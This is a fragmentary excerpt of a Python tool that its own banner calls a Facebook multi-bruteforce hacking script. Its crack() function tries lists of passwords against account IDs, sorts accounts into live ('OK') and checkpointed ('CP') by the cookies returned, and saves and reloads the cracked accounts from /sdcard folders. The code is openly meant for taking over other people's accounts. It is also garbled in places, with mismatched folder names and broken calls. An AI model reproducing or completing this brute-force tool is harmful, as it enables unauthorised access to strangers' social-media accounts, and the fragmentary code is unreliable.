...
def banner():
	clear()
	wel='# SCRIPT MULTI BRUTEFORCE FACEBOOK,SCRIPT PERETASAN FACEBOOK BERBASIS MULTI BRUTE, -SCRIPT PUBLISHER BY : Rehan Brand-'
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# THIS SCRIPT SHOULD ONLY BE USED BY PEOPLE WHO HAVE OBTAINED PERMISSION FROM AUTHOR : Rehan Nawaz, CONTACT ACCESS PERMIT:03078462058'
	fx = mark(sg, style=' bold blue')
	sol().print(fx)
	sg = '# 🖥️SCRIPT USER NAME🖥️ '
	fx = mark(sg, style=' bold green')
	sol().print(fx)
	print(x+'['+h+'✓'+x+'] NAME  Rehan Nawaz : '+str(my_name))
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/Reddy-DATA/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/Rehan-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/Rehan-DATA/CP/'+geh,'r').read().splitlines()
			except:
		...
		try:vin = os.listdir('/sdcard/Rehan-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/Reddy-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/Rehan-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/Rehan-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		for isi in my_files:
			try:hem = open('/sdcard/Rehan-DATA/CP/'+isi,'r').readlines()
				...
				try:hem = open('/sdcard/Rehan-DATA/OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/Rehan-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/Rehan-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%sReddy %s🐍%s 🐍 OK:%s 🐍 CP:%s 🐍 %s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='Reddy XD CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='Reddy LIVE'))
					ok+=1
					break
					...
					cetak(nel(statusok1, title='[bold green]Reddy LIVE[/bold green]'))
					ok+=1
					break
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			exit()
	dah = '# DONE'
	soReddyprint(mark(dah, style='green'))
	exit()
